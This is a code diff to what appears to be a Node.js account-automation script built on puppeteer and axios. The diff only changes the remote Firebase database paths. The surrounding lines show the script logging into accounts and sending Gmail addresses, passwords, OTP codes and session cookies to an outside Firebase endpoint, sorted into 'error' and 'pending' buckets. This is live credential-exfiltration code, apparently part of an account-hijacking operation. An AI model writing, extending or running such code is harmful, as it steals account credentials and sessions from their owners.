@@ -3,7 +3,7 @@ const puppeteer = require('puppeteer-extra')
 const axios = require('axios')
 
 
-const BASE_URL = 'https://server-9099-default-rtdb.firebaseio.com/raiyan086/collect' 
+const BASE_URL = 'https://server-9099-default-rtdb.firebaseio.com/raiyan086/pending' 
 
 
 let mCookie = [
@@ -396,7 +396,7 @@ async function loginWithCompleted(number, password, cookies) {
                 if (mRapt == null) {
                     console.log('Chenge Error: '+number)
                 
-                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code/error/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, year:mNumber.year, otp:mCodeSend, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
+                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code_pending/error/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, year:mNumber.year, otp:mCodeSend, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
                         headers: {
                             'Content-Type': 'application/x-www-form-urlencoded'
                         }
@@ -404,7 +404,7 @@ async function loginWithCompleted(number, password, cookies) {
                 } else {
                     console.log('All Chenge Success: '+number)
                 
-                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code/pending/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, year:mNumber.year, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
+                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code_pending/pending/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, year:mNumber.year, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
                         headers: {
                             'Content-Type': 'application/x-www-form-urlencoded'
                         }
